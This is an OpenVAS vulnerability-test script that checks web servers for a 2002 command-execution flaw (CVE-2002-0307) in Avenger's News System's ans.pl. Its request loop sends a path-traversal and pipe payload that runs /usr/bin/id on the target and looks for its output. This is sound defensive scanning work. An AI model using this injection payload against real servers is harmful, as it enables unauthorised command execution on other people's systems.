###############################################################################
# OpenVAS Vulnerability Test
# $Id: avengers_news_system_command_execution.nasl 6056 2017-05-02 09:02:50Z teissa $
#
# Avenger's News System Command Execution
#
# Authors:
# SecurITeam
#
# Copyright:
# Copyright (C) 2002 SecurITeam
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.10875");
  script_version("$Revision: 6056 $");
  script_tag(name:"last_modification", value:"$Date: 2017-05-02 11:02:50 +0200 (Tue, 02 May 2017) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_bugtraq_id(4147);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_cve_id("CVE-2002-0307");
  script_name("Avenger's News System Command Execution");
  script_category(ACT_ATTACK);
  script_copyright("This script is Copyright (C) 2002 SecurITeam");
  script_family("Web application abuses");
  script_dependencies("find_service.nasl", "no404.nasl");
  script_require_ports("Services/www", 80);
  script_exclude_keys("Settings/disable_cgi_scanning");

  script_xref(name:"URL", value:"http://www.securiteam.com/unixfocus/5MP090A6KG.html");

  script_tag(name:"solution", value:"see reference");
  script_tag(name:"summary", value:"A security vulnerability in Avenger's News System (ANS) allows
  command execution by remote attackers who have access to the ANS page.");

  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

port = get_http_port( default:80 );

foreach dir( make_list_unique( "/", cgi_dirs( port:port ) ) ) {

  if( dir == "/" ) dir = "";

  foreach url( make_list( dir + "/ans.pl?p=../../../../../usr/bin/id|&blah",
                          dir + "/ans/ans.pl?p=../../../../../usr/bin/id|&blah" ) ) {

    req = http_get( item:url, port:port );
    buf = http_keepalive_send_recv( port:port, data:req );

    if( "uid=" >< buf && "groups=" >< buf ) {
      report = report_vuln_url( port:port, url:url );
      security_message( port:port, data:report );
      exit( 0 );
    }
  }
}

exit( 99 );
